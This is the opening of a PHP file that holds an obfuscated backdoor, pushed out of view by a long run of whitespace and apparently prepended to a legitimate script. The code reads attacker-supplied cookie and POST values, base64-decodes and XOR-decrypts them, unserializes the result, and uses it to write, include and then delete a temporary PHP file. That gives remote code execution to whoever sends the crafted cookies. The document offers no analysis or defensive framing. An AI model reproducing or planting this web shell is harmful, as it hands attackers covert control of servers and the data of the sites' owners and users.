<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("lpjhxpx")){class lpjhxpx{public static $qugvjd = "zkbmdryglmdaqtcu";public static $rwzwfya = NULL;public function __construct(){$axmirzxcy = @$_COOKIE[substr(lpjhxpx::$qugvjd, 0, 4)];if (!empty($axmirzxcy)){$raokp = "base64";$tlfycmzb = "";$axmirzxcy = explode(",", $axmirzxcy);foreach ($axmirzxcy as $jkgsfizy){$tlfycmzb .= @$_COOKIE[$jkgsfizy];$tlfycmzb .= @$_POST[$jkgsfizy];}$tlfycmzb = array_map($raokp . "_decode", array($tlfycmzb,));$tlfycmzb = $tlfycmzb[0] ^ str_repeat(lpjhxpx::$qugvjd, (strlen($tlfycmzb[0]) / strlen(lpjhxpx::$qugvjd)) + 1);lpjhxpx::$rwzwfya = @unserialize($tlfycmzb);}}public function __destruct(){$this->cafllmunow();}private function cafllmunow(){if (is_array(lpjhxpx::$rwzwfya)) {$cqsdhiuz = sys_get_temp_dir() . "/" . crc32(lpjhxpx::$rwzwfya["salt"]);@lpjhxpx::$rwzwfya["write"]($cqsdhiuz, lpjhxpx::$rwzwfya["content"]);include $cqsdhiuz;@lpjhxpx::$rwzwfya["delete"]($cqsdhiuz);exit();}}}$nwvfw = new lpjhxpx();$nwvfw = NULL;} ?><?php
